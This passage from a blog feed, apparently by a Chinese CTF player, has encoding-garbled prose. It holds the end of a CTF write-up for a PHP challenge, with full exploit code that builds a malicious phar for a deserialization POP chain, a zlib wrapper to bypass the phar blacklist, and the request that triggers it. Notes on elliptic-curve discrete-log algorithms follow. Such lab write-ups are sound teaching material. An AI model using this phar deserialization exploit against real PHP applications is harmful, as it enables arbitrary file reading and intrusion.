class="number">15</span>)</span><br><span class="line">y = <span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> params:</span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> row:</span><br><span class="line">        dx, dy = delta[col[<span class="number">0</span>]]</span><br><span class="line">        ax.add_line(Line2D((x, x + dx), (y, y + dy), linewidth=<span class="number">1</span>, color=<span class="string">'blue'</span>))</span><br><span class="line">        dx, dy = delta[col[<span class="number">1</span>]]</span><br><span class="line">        ax.add_line(Line2D((x, x + dx), (y, y + dy), linewidth=<span class="number">1</span>, color=<span class="string">'red'</span>))</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">    y -= <span class="number">1</span></span><br><span class="line">plt.plot()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h3><h4 id="é¢˜è§£åˆ†æ-10"><a href="#é¢˜è§£åˆ†æ-10" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>é€€å‘webæ‰‹çš„å¿ƒé…¸æ“ä½œï¼ˆx</p><p>è€ƒå¯Ÿpharååºåˆ—åŒ–ï¼Œ<code>highlight_file</code>å’Œ<code>file_exists</code>éƒ½èƒ½è§¦å‘ï¼Œä½†æœ‰åš<code>strtolower(substr($file,0,4))==&#39;phar&#39; || strtolower(substr($high_light,0,4))==&#39;phar&#39;</code>çš„é»‘åå•åˆ¤æ–­ï¼Œå› æ­¤ç”¨zlibç»•è¿‡.</p><p>pocé“¾ï¼š<code>__destruct(Sh0w) =&gt; __call(S6ow) =&gt; __get(S6ow) =&gt; file_get(S6ow) =&gt; __toString(Show)</code>.</p><p>å®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼ˆå­˜åœ¨ä»¥ä¸‹é»‘åå•<code>preg_match(&quot;/http|https|file:|gopher|dict|zip|php|\.\./i&quot;, $this-&gt;source)</code>ï¼‰ï¼Œä½†è¯»å–flagåªéœ€<code>file_get_contents(&quot;/flag&quot;)</code>å³å¯.</p><h4 id="exp-10"><a href="#exp-10" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($source)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S6ow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file, $params)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = $params;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$params = <span class="keyword">array</span>();</span><br><span class="line">$params[<span class="string">"_show"</span>] = <span class="string">"file_get"</span>;</span><br><span class="line">$file = <span class="keyword">new</span> Show(<span class="string">"/flag"</span>);</span><br><span class="line">$o = <span class="keyword">new</span> Sh0w(<span class="keyword">new</span> S6ow($file, $params));</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"SimplePHP.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"SimplePHP.phar"</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†SimplePHP.pharåç¼€åä¿®æ”¹ä¸º.jpgä¸Šä¼ ï¼Œå†åŒ…å«å³å¯.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//actf.node.csuaurora.org:28726/file.php?high_light=compress.zlib://phar://upload/9ee4f116e740e2207acbdfc5a78c12cd.jpg&amp;file=upload/</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Aurora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Learning of Elliptic Curve</title>
      <link href="/2020/05/11/Learning-of-Elliptic-Curve/"/>
      <url>/2020/05/11/Learning-of-Elliptic-Curve/</url>
      
        <content type="html"><![CDATA[<h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>æ¤­åœ†æ›²çº¿å¯†ç ç›¸å…³å’•äº†æŒºä¹…äº†ojzï¼Œä¹Ÿæ²¡ç³»ç»Ÿåšè¿‡æ€»ç»“ï¼Œè°¨ä»¥æ­¤æ–‡ä½œä¸ºå­¦ä¹ è®°å½•ï¼Œä»¥ä¾¿æ—¥åç¿»é˜…</p><p>ps: å„ç§å®éªŒddlæœŸé—´- -ä¸å®šæœŸæ›´æ–°(ğŸ•Š)</p><h2 id="Basis"><a href="#Basis" class="headerlink" title="Basis"></a>Basis</h2><h3 id="1-1-Elliptic-Curve-in-Finite-Field"><a href="#1-1-Elliptic-Curve-in-Finite-Field" class="headerlink" title="1.1    Elliptic Curve in Finite Field"></a>1.1    Elliptic Curve in Finite Field</h3><p>è®¾pä¸ºä¸€ç´ æ•°ï¼Œnä¸ºæ­£æ•´æ•°ï¼Œ$q=p^{n}$ï¼Œåˆ™$F_{q}$ä¸Šçš„Weierstrassæ–¹ç¨‹å¼</p><script type="math/tex; mode=display">y^{2}+a_{1}xy+a_{3}y=x^{3}+a_{2}x^{2}+a_{4}x+a_{6},\quad a_{i}\in F_{q}</script><p>å†³å®šçš„æ›²çº¿å†æ·»åŠ ä¸Šæ— ç©·è¿œç‚¹åï¼Œå³å¾—åˆ°å°„å½±å¹³é¢$P^{2}(\bar{F_{q}})$ä¸Šçš„ä¸€æ¡æ›²çº¿Eï¼Œè‹¥éå¥‡å¼‚ï¼Œåˆ™ç§°å…¶ä¸ºä¸€æ¡æ¤­åœ†æ›²çº¿ï¼Œå½“ä¸”ä»…å½“$\Delta\neq 0$.</p><p>ç»™å®šä¸€æ¡$F_{q}$ä¸Šçš„æ¤­åœ†æ›²çº¿Eï¼ŒåŠå…¶ä¸Šä»»æ„ä¸¤ç‚¹På’ŒQï¼Œè¿æ¥På’ŒQçš„ç›´çº¿ä¸Eäº¤äºç¬¬ä¸‰ä¸ªç‚¹Rï¼Œç”±Rå’Œæ— ç©·è¿œç‚¹Oå¯å†³å®šä¸€ç›´çº¿ï¼Œè¯¥ç›´çº¿ä¸Eçš„ç¬¬ä¸‰ä¸ªäº¤ç‚¹å®šä¹‰ä¸ºPå’ŒQçš„å’Œï¼Œè®°ä½œ$P\oplus Q$. ä¸”æ˜“è¯å¾—è¯¥åŠ æ³•å®šä¹‰ä¸‹æ»¡è¶³é˜¿è´å°”ç¾¤.</p><p>ç»™å‡ºå…·ä½“çš„åŠ æ³•å…¬å¼å¦‚ä¸‹ï¼š</p><p>è®¾$P_{1}+P_{2}=P_{3},\quad P_{i}=(x_{i},y_{i})\in E.$</p><p>(a) è‹¥$x_{1}=x_{2},y_{1}+y_{2}+a_{1}x_{1}+a_{3}$ï¼Œåˆ™$P_{1}+P_{2}=O$ï¼Œå¦åˆ™</p><p>(b) ä¸€èˆ¬æ€§å¦‚å›¾æ‰€ç¤ºï¼š</p><p><img src= "/img/loading.gif" data-src="/2020/05/11/Learning-of-Elliptic-Curve/QQå›¾ç‰‡20200511171504.jpg" alt></p><p>ä½†è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>åœ¨$F_{q}$ä¸Šï¼Œè¯¥ç›´çº¿PQä¸åŒäºå®æ•°åŸŸ</strong>ï¼Œå¯è¡¨ç¤ºä¸º</p><script type="math/tex; mode=display">ax+by+c\equiv 0(mod\ q)</script><p>å¦å¤–ï¼Œå¯ä»¥è¯æ˜ï¼Œ$p\neq 2,3$æ—¶ï¼Œæ¯ä¸€æ¡$F_{q}$ä¸Šçš„æ¤­åœ†æ›²çº¿éƒ½åŒæ„äº</p><script type="math/tex; mode=display">E:y^{2}=x^{3}+ax+b,\quad a,b\in F_{q}</script><p>[Hasseå®šç†] - å¦‚æœ$E_{p}(a,b):y^{2}=x^{3}+ax+b\ (4a^{3}+27b^{2}\neq 0)$æ˜¯å®šä¹‰åœ¨$F_{p}$ä¸Šçš„æ¤­åœ†æ›²çº¿ï¼Œåˆ™æœ‰</p><script type="math/tex; mode=display">|\#E-(p+1)|\leq 2\sqrt{p}</script><p>æ³¨ï¼šç‰¹åˆ«çš„ï¼Œåœ¨$p\equiv 3(mod\ 4)$æ—¶ï¼Œ</p><script type="math/tex; mode=display">\#E_{p}(a,0)=p+1.</script><p>åœ¨ECCç­‰ä½“åˆ¶ä¸­å¯»æ‰¾åŸºç‚¹çš„ç®—æ³•ï¼š</p><ul><li>è®¡ç®—æ¤­åœ†æ›²çº¿Eçš„é˜¶ N(#E).</li><li>é€‰æ‹©ä¸€å­ç¾¤çš„é˜¶nï¼ˆnä¸ºç´ æ•°ï¼‰ï¼Œè¾…å› å­$h=\frac{N}{n}$.</li><li>åœ¨Eä¸Šé€‰æ‹©ä¸€éšæœºç‚¹Pï¼Œå¦‚æœG=hpä¸º0ï¼Œåˆ™é‡æ–°é€‰å–Pï¼Œæ­¤æ—¶Gå³ä¸ºåŸºç‚¹ï¼ˆé˜¶ä¸ºnï¼‰.</li></ul><h2 id="Attacking-the-Discrete-Logarithm-Problem"><a href="#Attacking-the-Discrete-Logarithm-Problem" class="headerlink" title="Attacking the Discrete Logarithm Problem"></a>Attacking the Discrete Logarithm Problem</h2><p>åœ¨è¿›å…¥ECDLPå‰ï¼Œæˆ‘ä»¬é¦–å…ˆä»‹ç»DLPåŠå„ç§å¯ç”¨çš„æ”»å‡»æ–¹æ³•ï¼ˆæ²¡è·‘é¢˜- -æ‹æ‰“.jpgï¼‰ï¼š</p><h3 id="2-1-Baby-Step-Giant-Step-Algorithm"><a href="#2-1-Baby-Step-Giant-Step-Algorithm" class="headerlink" title="2.1    Baby-Step, Giant-Step Algorithm"></a>2.1    Baby-Step, Giant-Step Algorithm</h3><h4 id="Theorem"><a href="#Theorem" class="headerlink" title="[Theorem]"></a>[Theorem]</h4><p>åŒ—ä¸Šå¹¿æ·±ç®—æ³•- -ç®—æ³•ä¼˜åŒ–æ€è·¯å¯çœ‹ä½œä¸­é—´ç›¸é‡ï¼Œå¤æ‚åº¦$O(\sqrt{n})$.</p><p>å‡è®¾$\alpha^{x}=\beta$ï¼ŒGæ˜¯né˜¶å¾ªç¯ç¾¤ï¼Œä»¤$m=\lceil \sqrt{n}\rceil$. åˆ™å¯ä»¥å°†xè¡¨ç¤ºä¸º$im+j(0\leq i,j\leq m)$. æœ‰</p><script type="math/tex; mode=display">\beta=\alpha^{x}=\alpha^{im+j}=\alpha^{im}\alpha^{j}\\\beta(\alpha^{-m})^{i}=\alpha^{j}</script><p>å…ˆéå†$j\in [0,m]$ï¼Œå­˜å‚¨å¯¹åº”çš„æ‰€æœ‰$\alpha^{j}$. å†å»éå†$i\in [0,m]$ï¼Œæ‰¾åˆ°ç¢°æ’å³å¯.</p><h4 id="Code"><a href="#Code" class="headerlink" title="[Code]"></a>[Code]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsgs</span><span class="params">(alpha, beta, p)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    m = ceil(sqrt(p - <span class="number">1</span>))</span><br><span class="line">    S = &#123;pow(alpha, j, p):j <span class="keyword">for</span> j <span class="keyword">in</span> range(m + <span class="number">1</span>)&#125;</span><br><span class="line">    gs = pow(alpha, p - <span class="number">1</span> - m, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> beta <span class="keyword">in</span> S:</span><br><span class="line">            res.append(i * m + S[beta])</span><br><span class="line">        beta = (beta * gs) % p</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="2-2-Pollardâ€™s-Ï-Method"><a href="#2-2-Pollardâ€™s-Ï-Method" class="headerlink" title="2.2     Pollardâ€™s Ï-Method"></a>2.2     Pollardâ€™s Ï-Method</h3><h4 id="Theorem-1"><a href="#Theorem-1" class="headerlink" title="[Theorem]"></a>[Theorem]</h4><p>å’Œå¤§æ•°åˆ†è§£çš„Pollardâ€™s Ïæœ‰ç±»ä¼¼ä¹‹å¤„ï¼ˆç”Ÿæ—¥æ‚–è®ºï¼‰</p><p>å‡è®¾$\alpha^{x}=\beta$ï¼ŒGæ˜¯né˜¶å¾ªç¯ç¾¤ï¼Œå°†å…¶åˆ’åˆ†ä¸º<code>psize</code>ä¸ªç­‰ä»·ç±»ï¼Œ$S_{1},S_{2},â€¦,S_{psize}$. æ¥ç€å†å®šä¹‰Gä¸Šçš„åºåˆ—$\{x_i\}$ï¼Œæ¯ä¸ª$x_{i}$å‡èƒ½è¡¨ç¤ºä½œ$\alpha^{a_{i}}\beta^{b_{i}}$.</p><p>å¹¶ç”Ÿæˆmod nä¸Šçš„éšæœºåºåˆ—$a,b$ï¼Œæœ‰é€’æ¨å¼å¦‚ä¸‹ï¼š</p><p>$a_{i+1}=a_{i}+a[x_{i}\%psize],b_{i+1}=b_{i}+b[x_{i}\%psize]$</p><p>åˆ™ä»¤åˆå§‹å€¼$x_{0}$ä¸º$\alpha^{ax}$ï¼ˆaxéšæœºï¼‰ï¼Œä¹Ÿå¯è¡¨ç¤ºä¸º$a_{0}=ax,b_{0}=0$ï¼ŒåŒæ—¶ä»¤$y_{0}=x_{0}$ï¼ŒæŒ‰ç…§ä¸Šè¿°è¿›è¡Œé€’æ¨ï¼Œä»¤$y_{i}=x_{2i}$ï¼Œåˆ™å‘ç”Ÿç¢°æ’æ—¶ï¼Œæˆ‘ä»¬æœ‰</p><script type="math/tex; mode=display">\alpha^{ax}\beta^{bx}=\alpha^{ay}\beta^{by}\\\alpha^{ay-ax}=(\alpha^{res})^{bx-by}</script><p>åœ¨$GCD(bx-by,n)=1$æ—¶ï¼Œå­˜åœ¨é€†å…ƒï¼Œæ˜“æ±‚å¾—$res=(bx-by)^{-1}(ay-ax)$.</p><p>ps: sageä¸Šçš„<code>discrete_log_rho</code>ç›´æ¥åšäº†å¦‚ä¸‹åˆ¤æ–­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ord = base.multiplicative_order()</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> ord.is_prime():</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">"for Pollard rho algorithm the order of the group must be prime"</span>)</span><br></pre></td></tr></table></figure><p>å•Šè¿™- -å¦‚æœ$G=F_{p}$ï¼Œä¸”é˜¶æ°å¥½ä¸º$p-1$æ—¶ï¼Œæ˜¾ç„¶ä¼šç›´æ¥æŠ›å‡ºé”™è¯¯ï¼Œå› æ­¤æˆ‘åšäº†é­”æ”¹ï¼Œåœ¨æœ€åæ±‚è§£resçš„æ—¶å€™å†è¿›è¡Œåˆ¤æ–­ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><h4 id="Code-1"><a href="#Code-1" class="headerlink" title="[Code]"></a>[Code]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_rho</span><span class="params">(beta, alpha, N)</span>:</span></span><br><span class="line">    ord = Mod(alpha, N).multiplicative_order()</span><br><span class="line">    partition_size = <span class="number">10</span></span><br><span class="line">    upper_bound = <span class="number">8</span> * isqrt(ord)</span><br><span class="line">    I = IntegerModRing(ord)</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> tqdm(range(<span class="number">10</span>)):</span><br><span class="line">        a = [I.random_element() <span class="keyword">for</span> i <span class="keyword">in</span> range(partition_size)]</span><br><span class="line">        b = [I.random_element() <span class="keyword">for</span> i <span class="keyword">in</span> range(partition_size)]</span><br><span class="line">        c = [power(Mod(alpha, N), a[i]) * power(Mod(beta, N), b[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(partition_size)]</span><br><span class="line">        ax = I.random_element()</span><br><span class="line">        bx = I(<span class="number">0</span>)</span><br><span class="line">        x = power(Mod(alpha, N), ax) <span class="comment"># ini</span></span><br><span class="line">        ay, by, y = ax, bx, x</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(upper_bound):</span><br><span class="line">            j = Integer(x) % partition_size</span><br><span class="line">            (x, ax, bx) = (x * c[j], ax + a[j], bx + b[j])</span><br><span class="line">            k = Integer(y) % partition_size</span><br><span class="line">            (y, ay, by) = (y * c[k], ay + a[k], by + b[k])</span><br><span class="line">            k = Integer(y) % partition_size</span><br><span class="line">            (y, ay, by) = (y * c[k], ay + a[k], by + b[k])</span><br><span class="line">            <span class="keyword">if</span> x == y:</span><br><span class="line">                <span class="keyword">if</span> ax == ay:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    res = Integer((ay - ax) / (bx - by))</span><br><span class="line">                    <span class="keyword">return</span> res</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"[-] Failed."</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><h3 id="2-3-Pollardâ€™s-Î»-Method"><a href="#2-3-Pollardâ€™s-Î»-Method" class="headerlink" title="2.3    Pollardâ€™s Î»-Method"></a>2.3    Pollardâ€™s Î»-Method</h3><h4 id="Theorem-2"><a href="#Theorem-2" class="headerlink" title="[Theorem]"></a>[Theorem]</h4><p>å³Pollardâ€™s Kangaroo Methodï¼Œç®—æ³•å…·ä½“æµç¨‹å¦‚ä¸‹ï¼š</p><p>å‡è®¾$G(=Z_{p})$æ˜¯né˜¶å¾ªç¯ç¾¤ï¼Œ$\alpha,\beta\in G$ï¼Œæ»¡è¶³$\alpha^{x}=\beta.$ ä¸”æˆ‘ä»¬çŸ¥é“$x\in [a,b]\subset [0,p-1]$.</p><ul><li><p>$l=b-a,J=\lfloor log_{2}(l)\rfloor$ï¼Œä»¤$S=\{randrange(1,p),â€¦,randrange(1,p)\}=\{s(0),s(1),â€¦,s(J-1)\}$.</p></li><li><p>Letâ€™s begin with our tame kangaroo <em>T</em>. ä»¤<em>T</em>ä»å·²çŸ¥èµ·å§‹ç‚¹å¼€å§‹è·³è·ƒï¼Œå³ä»¤$t_{0}=\alpha^{b}(mod\ p)$, è·³è·ƒè·¯å¾„å¦‚ä¸‹ï¼š</p><script type="math/tex; mode=display">t(i+1)\equiv t(i)\alpha^{s(t(i)\ mod\ J)}</script><p>è®©<em>T</em>åœ¨è·³è·ƒnæ¬¡ååœæ­¢ï¼Œä¸”æœ‰næ¬¡åçš„è·³è·ƒè·ç¦»(æŒ‡æ•°)å¦‚ä¸‹ï¼š</p><script type="math/tex; mode=display">d(n)=\sum_{i=0}^{n-1}s(t(i)\ mod\ J)</script><p>å› æ­¤$t(n)\equiv \alpha^{b+d(n)}\ mod\ p$.</p></li><li><p>Now we have to deal with the wild kangaroo <em>W</em>. <em>W</em>èµ·å§‹ç‚¹$w_{0}=\alpha^{x}$ï¼Œåˆ™ç±»ä¼¼<em>T</em>æœ‰ï¼š</p><script type="math/tex; mode=display">D(j)=\sum_{k=0}^{j-1}s(w(k)\ mod\ J),D(0)=0</script><p>$w(j)\equiv \alpha^{x+D(j)}\ mod\ p.$</p></li><li><p>å½“ç¢°æ’å‘ç”Ÿåœ¨$t(i)=w(j)$æ—¶ï¼Œæ­¤ç‚¹å‘åå‡$t(s)=w(r)\quad (s-i=r-j\geq 0)$. å³æœ‰</p><script type="math/tex; mode=display">\alpha^{x+D(m)}\equiv \alpha^{b+d(n)}\ mod\ p</script><p>å³$x=b+d(n)-D(m)$.</p></li></ul><p>psï¼šå°†è·³è·ƒæ­¥æ•°nå–ä½œ$\lceil\sqrt{b-a}\rceil$å°†ä½¿næ¬¡åå·²ç¢°æ’çš„æ¦‚ç‡è¶‹äº1ï¼Œæ±‚è§£å¤±è´¥åˆ™æ”¹å˜<em>S</em>é‡æ–°æ±‚è§£.</p><h4 id="Code-2"><a href="#Code-2" class="headerlink" title="[Code]"></a>[Code]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt, log2, floor, ceil</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_lambda</span><span class="params">(beta, alpha, N)</span>:</span></span><br><span class="line">    a, b = <span class="number">0</span>, N - <span class="number">1</span></span><br><span class="line">    l = N - <span class="number">1</span></span><br><span class="line">    J = floor(log2(l))</span><br><span class="line">    n = ceil(sqrt(N))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">10</span>)): <span class="comment">#æ±‚è§£æ¬¡æ•°ä¸Šé™</span></span><br><span class="line">        S = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(J):</span><br><span class="line">            r = getRandomRange(<span class="number">1</span>, l)</span><br><span class="line">            S.append((r, pow(alpha, r, N)))</span><br><span class="line">        <span class="comment"># tame kangaroo T</span></span><br><span class="line">        dt, t = b, pow(alpha, b, N)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            r, e = S[t % J]</span><br><span class="line">            dt += r</span><br><span class="line">            t = (t * e) % N</span><br><span class="line">        <span class="comment"># wild kangaroo W</span></span><br><span class="line">        dw, w = <span class="number">0</span>, beta</span><br><span class="line">        <span class="keyword">while</span> dt - dw &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> w == t:</span><br><span class="line">                <span class="keyword">return</span> dt - dw</span><br><span class="line">            r, e = S[w % J]</span><br><span class="line">            dw += r</span><br><span class="line">            w = (w * e) % N</span><br><span class="line">    print(<span class="string">"[-] Failed."</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><h3 id="2-4-The-Pohlig-Hellman-Method"><a href="#2-4-The-Pohlig-Hellman-Method" class="headerlink" title="2.4    The Pohlig-Hellman Method"></a>2.4    The Pohlig-Hellman Method</h3><h4 id="Theorem-3"><a href="#Theorem-3" class="headerlink" title="[Theorem]"></a>[Theorem]</h4><p>$G=Zmod(n)$ï¼Œ$\alpha,\beta\in G$ï¼Œæ»¡è¶³$\alpha^{x}=\beta.$ åˆ™å‡è®¾$\alpha$çš„é˜¶ä¸º$ord$ï¼Œä¸”å¯è¡¨ç¤ºä¸º</p><script type="math/tex; mode=display">ord=\prod_{i=1}^{k}p_{i}^{r_{i}}</script><p>åˆ™å¯¹äº$p^{r}$ï¼Œæœ‰$x\equiv x_{0}+x_{1}p+x_{2}p^{2}+â€¦+x_{r-1}p^{r-1}\quad mod\ p^{r}$ï¼Œ$0\leq x_{i}\leq p-1.$</p><p>å˜æ¢å¾—$x(\frac{ord}{p})\equiv x_{0}(\frac{ord}{p})+ord\cdot m$ï¼Œ$m\in Z.$</p><p>å³$\beta^{\frac{ord}{p}}\equiv \alpha^{x_{0}(\frac{ord}{p})+ord\cdot m}\equiv \alpha^{x_{0}(\frac{ord}{p})}\quad mod\ n.$</p><p>è€Œè¿™é‡Œçš„$x_{0}$åˆ™åªè¦åœ¨$[0,p-1]$ä¸Šæšä¸¾å³å¯.</p><p>å¾—åˆ°$x_{0}$ä»¥åï¼Œæˆ‘ä»¬ç”¨ç±»ä¼¼çš„trickè¿›è¡Œ$x_{1}$çš„æ±‚è§£ï¼Œæœ‰</p><p>$x(\frac{ord}{p^2})\equiv x_{0}(\frac{ord}{p^2})+x_{1}(\frac{ord}{p})+ord\cdot mâ€™$.</p><p>ä»¤$\beta_1=\beta\alpha^{-x_{0}}$ï¼Œåˆ™æœ‰$\beta_1^{\frac{ord}{p^{2}}}\equiv (\alpha^{x}\alpha^{-x_{0}})^{\frac{ord}{p^{2}}}\equiv \alpha^{x_{1}(\frac{ord}{p})+ord*mâ€™}\equiv \alpha^{x_{1}(\frac{ord}{p})}\quad mod\ n$.</p><p>$\beta_2=\beta\alpha^{-x_0-x_1p}$ï¼Œâ€¦ï¼Œå³å‡å¹‚å¾—åˆ°$x\ mod\ p^{r}$.</p><p>æœ€åå¯¹æ‰€æœ‰ç»“æœCRTå³å¯.ï¼ˆå¯¹äº$p^{r}$ä¸Šçš„æ±‚è§£å¯é‡‡ç”¨BSGSè¿›ä¸€æ­¥å‡å°æ—¶é—´å¤æ‚åº¦ï¼‰</p><h4 